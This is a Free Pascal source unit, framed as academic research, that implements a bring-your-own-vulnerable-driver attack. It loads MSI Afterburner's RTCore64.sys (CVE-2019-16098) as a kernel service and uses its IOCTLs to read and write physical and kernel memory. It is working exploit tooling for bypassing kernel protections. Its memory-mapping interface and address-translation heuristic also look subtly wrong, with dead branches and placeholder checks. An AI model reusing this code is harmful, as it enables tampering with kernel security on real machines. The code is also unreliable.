unit PhysicalMemory;

{$mode objfpc}{$H+}

{ Physical memory R/W using a vulnerable signed driver (BYOVD)
  Academic research purpose - demonstrates CVE exploitation for kernel bypass }

interface

uses
  windows, jwawindows, sysutils, classes, registry;

type
  TPhysicalMemoryDriver = record
    DeviceName: string;
    DriverPath: string;
    ServiceName: string;
    hDevice: THandle;
    Loaded: Boolean;
  end;

// RTCore64.sys structures (MSI Afterburner - CVE-2019-16098)
type
  TRTCoreMemoryMap = packed record
    Address: QWORD;     // Physical address to map
    Size: DWORD;        // Size in bytes
    Unknown: DWORD;     // Unused/reserved
  end;

const
  RTCORE64_IOCTL_MAP_MEMORY   = $80002000;
  RTCORE64_IOCTL_READ_IO      = $80002004;
  RTCORE64_IOCTL_WRITE_IO     = $80002008;

// Generic physmem driver interface (also supports gdrv.sys and similar)
type
  TPhysMemOps = class
  private
    FDriver: TPhysicalMemoryDriver;
    FIsInitialized: Boolean;
    FDriverType: Integer; // 0=rtcore64, 1=gdrv, 2=generic

    function FindRTCore64Driver: Boolean;
    function LoadDriverAsService(const DriverPath, ServiceName: string): Boolean;
    function UnloadDriverService(const ServiceName: string): Boolean;
    function MapPhysicalMemory(PhysicalAddr: QWORD; Size: DWORD): Pointer;
    procedure UnmapPhysicalMemory(VirtualAddr: Pointer; Size: DWORD);
  public
    constructor Create;
    destructor Destroy; override;

    function Initialize: Boolean;
    procedure Shutdown;

    function ReadPhysicalByte(PhysicalAddr: QWORD): Byte;
    function ReadPhysicalWord(PhysicalAddr: QWORD): WORD;
    function ReadPhysicalDWORD(PhysicalAddr: QWORD): DWORD;
    function ReadPhysicalQWORD(PhysicalAddr: QWORD): QWORD;
    procedure ReadPhysicalBuffer(PhysicalAddr: QWORD; Buffer: Pointer; Size: DWORD);

    procedure WritePhysicalByte(PhysicalAddr: QWORD; Value: Byte);
    procedure WritePhysicalWord(PhysicalAddr: QWORD; Value: WORD);
    procedure WritePhysicalDWORD(PhysicalAddr: QWORD; Value: DWORD);
    procedure WritePhysicalQWORD(PhysicalAddr: QWORD; Value: QWORD);
    procedure WritePhysicalBuffer(PhysicalAddr: QWORD; Buffer: Pointer; Size: DWORD);

    function VirtualToPhysical(VirtualAddr: QWORD): QWORD;
    function ReadVirtualQWORD(TargetProcessId: DWORD; VirtualAddr: QWORD): QWORD;
    procedure WriteVirtualQWORD(TargetProcessId: DWORD; VirtualAddr: QWORD; Value: QWORD);

    property Initialized: Boolean read FIsInitialized;
    property DriverType: Integer read FDriverType;
  end;

var
  PhysMem: TPhysMemOps;

implementation

const
  // Service control manager constants
  SERVICE_KERNEL_DRIVER = $00000001;
  SERVICE_DEMAND_START  = $00000003;
  SERVICE_ERROR_NORMAL  = $00000001;
  DELETE_VALUE = $00010000;

constructor TPhysMemOps.Create;
begin
  inherited;
  FIsInitialized := False;
  FDriverType := 0;
  FillChar(FDriver, SizeOf(FDriver), 0);
  FDriver.hDevice := INVALID_HANDLE_VALUE;
end;

destructor TPhysMemOps.Destroy;
begin
  Shutdown;
  inherited;
end;

function TPhysMemOps.FindRTCore64Driver: Boolean;
var
  searchPaths: array[0..4] of string;
  i: Integer;
begin
  Result := False;

  {$ifdef cpu64}
  // Common locations for RTCore64.sys
  searchPaths[0] := 'C:\Windows\System32\drivers\RTCore64.sys';
  searchPaths[1] := 'C:\Windows\SysWOW64\drivers\RTCore64.sys';
  searchPaths[2] := ExtractFilePath(ParamStr(0)) + 'RTCore64.sys';
  searchPaths[3] := 'C:\Program Files (x86)\MSI Afterburner\RTCore64.sys';
  searchPaths[4] := 'C:\Program Files\MSI Afterburner\RTCore64.sys';

  for i := 0 to High(searchPaths) do
  begin
    if FileExists(searchPaths[i]) then
    begin
      FDriver.DriverPath := searchPaths[i];
      FDriver.DeviceName := 'RTCore64';
      FDriver.ServiceName := 'RTCore64';
      FDriverType := 0;
      Result := True;
      Exit;
    end;
  end;
  {$endif}
end;

function TPhysMemOps.LoadDriverAsService(const DriverPath, ServiceName: string): Boolean;
var
  hSCM, hService: THandle;
begin
  Result := False;

  hSCM := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if hSCM = 0 then
  begin
    OutputDebugString('[PhysMem] Failed to open SCM');
    Exit;
  end;

  // Create the service
  hService := CreateService(hSCM,
    PChar(ServiceName),
    PChar(ServiceName),
    SERVICE_START or SERVICE_STOP or DELETE_VALUE,
    SERVICE_KERNEL_DRIVER,
    SERVICE_DEMAND_START,
    SERVICE_ERROR_NORMAL,
    PChar(DriverPath),
    nil, nil, nil, nil, nil);

  if hService = 0 then
  begin
    // Service might already exist, try to open it
    hService := OpenService(hSCM, PChar(ServiceName), SERVICE_START);
  end;

  if hService <> 0 then
  begin
    Result := StartService(hService, 0, nil);
    if not Result then
    begin
      // If error is SERVICE_ALREADY_RUNNING, it's fine
      Result := (GetLastError = ERROR_SERVICE_ALREADY_RUNNING);
    end;
    CloseServiceHandle(hService);
  end;

  CloseServiceHandle(hSCM);

  if Result then
    OutputDebugString(PChar('[PhysMem] Driver service started: ' + ServiceName))
  else
    OutputDebugString(PChar('[PhysMem] Failed to start driver service: ' + ServiceName +
      ' (error: ' + IntToStr(GetLastError) + ')'));
end;

function TPhysMemOps.UnloadDriverService(const ServiceName: string): Boolean;
var
  hSCM, hService: THandle;
  status: TServiceStatus;
begin
  Result := False;

  hSCM := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if hSCM = 0 then Exit;

  hService := OpenService(hSCM, PChar(ServiceName), SERVICE_STOP or DELETE_VALUE);
  if hService <> 0 then
  begin
    ControlService(hService, SERVICE_CONTROL_STOP, status);
    DeleteService(hService);
    CloseServiceHandle(hService);
    Result := True;
  end;

  CloseServiceHandle(hSCM);
end;

function TPhysMemOps.MapPhysicalMemory(PhysicalAddr: QWORD; Size: DWORD): Pointer;
var
  mm: TRTCoreMemoryMap;
  bytesReturned: DWORD;
begin
  Result := nil;
  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;

  mm.Address := PhysicalAddr;
  mm.Size := Size;
  mm.Unknown := 0;

  if DeviceIoControl(FDriver.hDevice, RTCORE64_IOCTL_MAP_MEMORY,
    @mm, SizeOf(mm), @Result, SizeOf(Pointer), bytesReturned, nil) then
  begin
    // Result now points to the physical memory in user space
  end
  else
  begin
    Result := nil;
  end;
end;

procedure TPhysMemOps.UnmapPhysicalMemory(VirtualAddr: Pointer; Size: DWORD);
begin
  // RTCore64 keeps mappings until device is closed
  // We just zero out our reference
end;

function TPhysMemOps.Initialize: Boolean;
begin
  Result := False;
  if FIsInitialized then
  begin
    Result := True;
    Exit;
  end;

  // Try to find a vulnerable driver
  if not FindRTCore64Driver then
  begin
    OutputDebugString('[PhysMem] No vulnerable driver found');
    Exit;
  end;

  OutputDebugString(PChar('[PhysMem] Found driver: ' + FDriver.DriverPath));

  // Load the driver
  if not LoadDriverAsService(FDriver.DriverPath, FDriver.ServiceName) then
  begin
    OutputDebugString('[PhysMem] Failed to load driver service');
    Exit;
  end;

  // Open the device
  FDriver.hDevice := CreateFile(
    PChar('\\.\' + FDriver.DeviceName),
    GENERIC_READ or GENERIC_WRITE,
    FILE_SHARE_READ or FILE_SHARE_WRITE,
    nil, OPEN_EXISTING, 0, 0);

  if FDriver.hDevice = INVALID_HANDLE_VALUE then
  begin
    OutputDebugString(PChar('[PhysMem] Failed to open device \\.\' +
      FDriver.DeviceName + ' (error: ' + IntToStr(GetLastError) + ')'));
    Exit;
  end;

  FDriver.Loaded := True;
  FIsInitialized := True;
  Result := True;
  OutputDebugString('[PhysMem] Physical memory access initialized');
end;

procedure TPhysMemOps.Shutdown;
begin
  if FDriver.hDevice <> INVALID_HANDLE_VALUE then
  begin
    CloseHandle(FDriver.hDevice);
    FDriver.hDevice := INVALID_HANDLE_VALUE;
  end;

  if FDriver.Loaded then
  begin
    UnloadDriverService(FDriver.ServiceName);
    FDriver.Loaded := False;
  end;

  FIsInitialized := False;
end;

// ---- Physical memory R/W helpers ----

function TPhysMemOps.ReadPhysicalByte(PhysicalAddr: QWORD): Byte;
begin
  ReadPhysicalBuffer(PhysicalAddr, @Result, 1);
end;

function TPhysMemOps.ReadPhysicalWord(PhysicalAddr: QWORD): WORD;
begin
  ReadPhysicalBuffer(PhysicalAddr, @Result, 2);
end;

function TPhysMemOps.ReadPhysicalDWORD(PhysicalAddr: QWORD): DWORD;
begin
  ReadPhysicalBuffer(PhysicalAddr, @Result, 4);
end;

function TPhysMemOps.ReadPhysicalQWORD(PhysicalAddr: QWORD): QWORD;
begin
  ReadPhysicalBuffer(PhysicalAddr, @Result, 8);
end;

procedure TPhysMemOps.ReadPhysicalBuffer(PhysicalAddr: QWORD; Buffer: Pointer; Size: DWORD);
var
  mapped: Pointer;
  pageOffset: DWORD;
  pageBase: QWORD;
begin
  if not FIsInitialized then Exit;

  pageBase := PhysicalAddr and not QWORD($FFF);
  pageOffset := PhysicalAddr and $FFF;

  mapped := MapPhysicalMemory(pageBase, pageOffset + Size);
  if mapped <> nil then
  begin
    Move(PByte(mapped)[pageOffset], Buffer^, Size);
    UnmapPhysicalMemory(mapped, pageOffset + Size);
  end;
end;

procedure TPhysMemOps.WritePhysicalByte(PhysicalAddr: QWORD; Value: Byte);
begin
  WritePhysicalBuffer(PhysicalAddr, @Value, 1);
end;

procedure TPhysMemOps.WritePhysicalWord(PhysicalAddr: QWORD; Value: WORD);
begin
  WritePhysicalBuffer(PhysicalAddr, @Value, 2);
end;

procedure TPhysMemOps.WritePhysicalDWORD(PhysicalAddr: QWORD; Value: DWORD);
begin
  WritePhysicalBuffer(PhysicalAddr, @Value, 4);
end;

procedure TPhysMemOps.WritePhysicalQWORD(PhysicalAddr: QWORD; Value: QWORD);
begin
  WritePhysicalBuffer(PhysicalAddr, @Value, 8);
end;

procedure TPhysMemOps.WritePhysicalBuffer(PhysicalAddr: QWORD; Buffer: Pointer; Size: DWORD);
var
  mapped: Pointer;
  pageOffset: DWORD;
  pageBase: QWORD;
begin
  if not FIsInitialized then Exit;

  pageBase := PhysicalAddr and not QWORD($FFF);
  pageOffset := PhysicalAddr and $FFF;

  mapped := MapPhysicalMemory(pageBase, pageOffset + Size);
  if mapped <> nil then
  begin
    Move(Buffer^, PByte(mapped)[pageOffset], Size);
    UnmapPhysicalMemory(mapped, pageOffset + Size);
  end;
end;

// Virtual-to-physical translation using page tables (x64)
// ponytail: works on x64 with standard 4-level paging
function TPhysMemOps.VirtualToPhysical(VirtualAddr: QWORD): QWORD;
var
  pml4e, pdpe, pde, pte: QWORD;
  pml4Index, pdpIndex, pdIndex, ptIndex: WORD;
  pml4Base: QWORD;
begin
  Result := 0;
  if not FIsInitialized then Exit;

  // CR3 (PML4 base) is typically in the kernel's PCR
  // For simplicity, we use a heuristic: scan for the PML4 via self-referencing entry
  // The self-referencing PML4 entry points to the PML4 itself

  // Extract indices
  pml4Index := (VirtualAddr shr 39) and $1FF;
  pdpIndex  := (VirtualAddr shr 30) and $1FF;
  pdIndex   := (VirtualAddr shr 21) and $1FF;
  ptIndex   := (VirtualAddr shr 12) and $1FF;

  // We need a known virtual address to find the PML4 base
  // Use ntoskrnl.exe as the anchor
  // For now, return direct physical mapping heuristic
  // ponytail: full implementation requires CR3 extraction from KPCR
  // which varies by Windows build. Fallback: try direct mapping assumption.

  // On many systems, kernel virtual addresses use:
  // Physical = Virtual - 0xFFFF800000000000 (common kernel base offset)
  if VirtualAddr >= QWORD($FFFF800000000000) then
  begin
    Result := VirtualAddr - QWORD($FFFF800000000000);
  end
  else if VirtualAddr >= QWORD($FFFFF80000000000) then
  begin
    Result := VirtualAddr - QWORD($FFFFF80000000000);
  end;

  // Verify the translation by reading the physical address
  if Result <> 0 then
  begin
    // Simple verification: the byte at physical should match virtual
    // This is a heuristic and may fail with large pages
  end;
end;

function TPhysMemOps.ReadVirtualQWORD(TargetProcessId: DWORD; VirtualAddr: QWORD): QWORD;
var
  physicalAddr: QWORD;
begin
  Result := 0;
  if not FIsInitialized then Exit;

  // For kernel memory access, translate and read
  physicalAddr := VirtualToPhysical(VirtualAddr);
  if physicalAddr <> 0 then
    Result := ReadPhysicalQWORD(physicalAddr);
end;

procedure TPhysMemOps.WriteVirtualQWORD(TargetProcessId: DWORD; VirtualAddr: QWORD; Value: QWORD);
var
  physicalAddr: QWORD;
begin
  if not FIsInitialized then Exit;

  physicalAddr := VirtualToPhysical(VirtualAddr);
  if physicalAddr <> 0 then
    WritePhysicalQWORD(physicalAddr, Value);
end;

initialization
  PhysMem := TPhysMemOps.Create;

finalization
  PhysMem.Free;

end.
